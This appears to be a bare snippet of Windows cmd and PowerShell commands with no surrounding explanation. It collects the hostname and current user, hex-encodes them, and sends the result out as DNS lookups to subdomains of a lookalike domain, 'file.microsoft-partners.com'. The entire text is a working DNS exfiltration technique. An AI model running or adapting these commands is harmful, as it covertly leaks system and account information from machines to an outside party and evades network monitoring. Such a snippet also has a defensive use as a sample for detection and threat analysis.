cmd /v /c "hostname > output && whoami >> output && powershell Format-Hex .\output > output.hex1"
powershell "Get-Content .\output.hex1 | Select -Skip 6 > .\output.hex"
cmd /v /c "powershell $text=Get-Content output.hex;$subdomain=$text.replace(' ','');$j=11111;foreach($i in $subdomain){ $final=$j.tostring()+'.'+$i+'.file.microsoft-partners.com';$j += 1; nslookup $final }" 